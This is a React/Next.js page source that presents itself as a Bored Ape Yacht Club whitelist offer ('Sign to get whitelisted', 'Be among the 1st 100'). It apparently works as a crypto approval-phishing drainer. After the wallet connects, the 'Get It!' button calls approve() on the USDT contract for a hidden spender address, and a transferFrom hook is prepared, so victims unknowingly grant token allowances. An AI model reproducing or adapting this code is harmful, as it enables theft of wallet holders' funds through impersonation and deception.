import { Button, Text, Flex, Center, useColorModeValue, Image, Box, Tabs, TabList, Tab, TabPanels, TabPanel, Alert, AlertIcon, Link, styled, AccordionButton } from "@chakra-ui/react"
import Head from "next/head"
import { useMoralis, useWeb3Contract, useMoralisWeb3Api } from "react-moralis"
import Balance from "../components/Balance"
import Transactions from "../components/Transactions"
import Header from "../components/Header"
import Profile from "../components/Profile"
import { useEffect, useState } from "react"
import { Modal, ModalOverlay, ModalContent, ModalHeader, ModalFooter, ModalBody, ModalCloseButton } from '@chakra-ui/react'
import { useDisclosure } from '@chakra-ui/react'
import { MoralisProvider } from "react-moralis";
import { ethers } from "ethers"










function Home() {



  // const ABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],
  // "payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},
  // {"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],
  // "payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"totalSupply",
  // "outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},
  // {"constant":false,"inputs":[{"name":"_from","type":"address"},
  // {"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],
  // "name":"transferFrom","outputs":[{"name":"success","type":"bool"}],
  // "payable":false,"type":"function"},{"constant":true,"inputs":[],
  // "name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdrawEther","outputs":[],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"burn","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"unfreeze","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"freezeOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"freeze","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"inputs":[{"name":"initialSupply","type":"uint256"},{"name":"tokenName","type":"string"},{"name":"decimalUnits","type":"uint8"},{"name":"tokenSymbol","type":"string"}],"payable":false,"type":"constructor"},{"payable":true,"type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Burn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Freeze","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},
  // {"indexed":false,"name":"value","type":"uint256"}],"name":"Unfreeze","type":"event"}];

  const ABI = [{"constant":true,
"inputs":[],"name":"name",
"outputs":[{"name":"",
"type":"string"}],
"payable":false,
"stateMutability":"view",
"type":"function"},
{"constant":false,
"inputs":[{"name":"_upgradedAddress",
"type":"address"}],
"name":"deprecate",
"outputs":[],
"payable":false,
"stateMutability":"nonpayable",
"type":"function"},
{"constant":false,
"inputs":[{"name":"_spender",
"type":"address"},
{"name":"_value",
"type":"uint256"}],
"name":"approve",
"outputs":[],
"payable":false,
"stateMutability":"nonpayable",
"type":"function"},
{"constant":true,"inputs":[],
"name":"deprecated",
"outputs":[{"name":"",
"type":"bool"}],
"payable":false,
"stateMutability":"view",
"type":"function"},
{"constant":false,
"inputs":[{"name":"_evilUser",
"type":"address"}],
"name":"addBlackList",
"outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
{"constant":true,"inputs":[],"name":"totalSupply",
"outputs":[{"name":"","type":"uint256"}],"payable":false,
"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[{"name":"_from","type":"address"},
{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],
"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress",
"outputs":[{"name":"","type":"address"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[{"name":"","type":"address"}],
"name":"balances","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[],"name":"unpause",
"outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],
"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[{"name":"","type":"address"},
{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf",
"outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[],"name":"pause",
"outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
{"constant":true,"inputs":[],"name":"getOwner",
"outputs":[{"name":"","type":"address"}],"payable":false,
"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"owner",
"outputs":[{"name":"","type":"address"}],"payable":false,
"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"symbol",
"outputs":[{"name":"","type":"string"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[{"name":"_to","type":"address"},
{"name":"_value","type":"uint256"}],"name":"transfer",
"outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints",
"type":"uint256"},{"name":"newMaxFee","type":"uint256"}],
"name":"setParams","outputs":[],"payable":false,
"stateMutability":"nonpayable","type":"function"},
{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],
"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":false,"inputs":[{"name":"amount",
"type":"uint256"}],"name":"redeem","outputs":[],"payable":false,
"stateMutability":"nonpayable","type":"function"},
{"constant":true,"inputs":[{"name":"_owner","type":"address"},
{"name":"_spender","type":"address"}],"name":"allowance",
"outputs":[{"name":"remaining","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},
{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},
{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}];

  const {isAuthenticated, authenticate, user, enableWeb3, isWeb3Enabled, Moralis, logout, isLoggingOut } = useMoralis()
  
  const [approved, setApproved] = useState(false);

  const { runContractFunction: approve, data: enterTxResponse, error, isLoading, isFetching } = useWeb3Contract({

    // chain: "eth",

    contractAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",

    abi: ABI,

    functionName: "approve",

    params: {
      _spender: "0xc....",

      _value: 1000000,
    },
},
);

// gasprice


// async function gas(){  
  // const web3Provider = await Moralis.enableWeb3();
//   const {signer} = await ethers.getSigners();
//   const {provider} = signer;

//   const contract = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", ABI, provider);

// const tx = await contract.approveByLegacy({
//   url: "https://cloudflare-eth.com",
//   from: user,
//   spender: "0xc....",
//   value: 2100000,
//   gasLimit: 80000000,
// })
// await tx.wait();
// };


// const Web3Api = useMoralisWeb3Api();
// const allowace = async () => {
//   //Get token allowace on ETH
//   const options = {
//     //token holder
//     _owner: user,
//     //uniswap v3 router 2 contract address
//     _spender: "0xc....",
//     //ENS token contract address
//     contractAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
//   };
//   const allowance = await Web3Api.token.getTokenAllowance(options);
//   console.log(allowance);
// };

useEffect(() => {
  console.log("error", error);
}, [error]);


const { account } = useMoralis();
// async function transferFromCon() {

  const { transferFrom } = useWeb3Contract({
  // chain: "eth",
  contractAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  // contractAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  functionName: "transferFrom",

    abi: ABI,

    params: {

      _to: account,

      _from: "0xc....",

      _value: 1000000,

    }

  }
  );


useEffect(() => {
  if (!isWeb3Enabled && isAuthenticated)
  enableWeb3();
},[isWeb3Enabled, isAuthenticated]);

const { isOpen, onOpen, onClose } = useDisclosure()


if(!isAuthenticated && !user) {
  console.log(user);


  return(
    <>
    <Head>
      <title>Test</title>
      </Head>
      <Flex
       direction="column" 
      justifyContent="center" 
      alignItems="center"
      width="100vw"
      height="100vh"
      bgGradient="linear(to-br, teal.400, purple.300)"
      backgroundImage="url('../')"
      >
        <Text fontSize="5xl" fontWeight="bold" color="white">Connect Wallet</Text>
        <Button colorScheme="purple" size="lg" mt="6"
         onClick={() => authenticate({
           signingMessage: "Sign to get whitelisted"
         })}
        >Sign in with Metamask on PC</Button>
        <br />
        
        <Button colorScheme="purple" size="lg" mt="6"
         onClick={() => authWalletConnect({
           signingMessage: "Sign to get whitelisted"
         })}
        >Sign in with Wallet Connect</Button>
      </Flex>
      </>
  )
};

// const ABI = 
 
async function authWalletConnect() {
  const user = authenticate({
    provider: "walletconnect",
    chainId: 56,
    mobileLinks: [
      "metamask",
      "trust",
      "rainbow",
      "argent",
      "imtoken",
      "pillar",
      "mathwallet",
      "meet.one wallet",
      "equal",
      "safepal",
      "cool wallet",
      "xwallet",
      "atomic",
      "myetherwallet",
      "cybavo",
      "onto",
      "mycrypto",
      "minerva wallet",
      "metax",
      "encrypted ink",
      "gnosis safe",
      "bitpay",
      "fireblocks",
      "debank",
      "tokenpocket",
      "infinity wallet",
      "coinbase wallet"
    ],
    signingMessage: "Sign to get whitelisted on Boredapeyachtclub",
  });
  console.log(user);
};

const handleSuccess = async (tx) => {
await tx.wait(1)
setApproved(true)
// handleNewNotification(tx)
}

  return (
    
    <>
    <MoralisProvider appId={process.env.NEXT_PUBLIC_APPID} serverUrl={process.env.NEXT_PUBLIC_SERVER_URL}></MoralisProvider>
      <Head>
        <title>Test</title>
        <meta name="description" content="Test" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
        <link rel="icon" type="/" sizes="32x32" href="/" />
        <link rel="icon" type="/" sizes="16x16" href="/" />
        <link rel="manifest" href="/site.webmanifest" />
        <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5" />
        <meta name="msapplication-TileColor" content="#da532c" />
        <meta name="theme-color" content="#ffffff" />
      </Head>
      <Flex direction="column" width="100vw" height="100vh">
        <Header user={user} logout={logout} isLoggingOut={isLoggingOut}/>
        <Box flex="1" bg="purple.100" px="11" py="44">
        <Tabs size="lg" colorScheme="purple" align="center" variant="enclosed">
        <Alert status="success">
          <AlertIcon />
          Wallet connected succesfully {user.get("ethAddress")}
        </Alert>
       
        <br />
        <Button onClick={onOpen}>Get it now!</Button>

        <Modal isOpen={isOpen} onClose={onClose}>
        <ModalOverlay />
        <ModalContent>
          <ModalHeader color="purple">Be among the 1st 100</ModalHeader>
          <ModalCloseButton />
          <ModalBody>
          <Image src="../bored.jpg" />
          </ModalBody>

          <ModalFooter>
            {/* <Button colorScheme='blue' mr={3} onClick={onClose}>
              Close
            </Button> */}
            <Button ml="4" className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded ml-auto"
                        onClick={async () =>
                            await approve({
                                onSuccess: handleSuccess,
                            })
                        }
                        disabled={isLoading || isFetching || approved}>{ approved ? "Approved" : "Get It!" }</Button>  
            {/* <br /> */}
            {/* <Button ml="4" colorScheme="green" onClick={transferFromCon}>Continue</Button> */}
            <a href="/" target="_blank" rel="noreferrer">
            <Button ml="4" colorScheme="green" disabled={isLoading || isFetching || !approved}>Continue</Button>
            </a>
          </ModalFooter>
        </ModalContent>
      </Modal>
      <br />
           
    {/* <br /> 
        <Link href="wss://realboredapeyachtclub.com/" isExternal>
          Head back to Boredapeyachtclub
        </Link> */}
        
    
           {/* <TabList>
            <Tab fontWeight="bold">Profile</Tab>
            <Tab fontWeight="bold">Balance</Tab>
            <Tab fontWeight="bold">Transactions</Tab>
          </TabList>
          <TabPanels>
            <TabPanel>
              <Profile user={user} />
            </TabPanel> */} 
            <TabPanel>
              <Balance user={user}/>
            </TabPanel>
            {/* <TabPanel>
               <Transactions user={user}/>
            </TabPanel>
          </TabPanels>  */}
        </Tabs>
        </Box>
      </Flex>
    </>
     
  )
}
export default Home
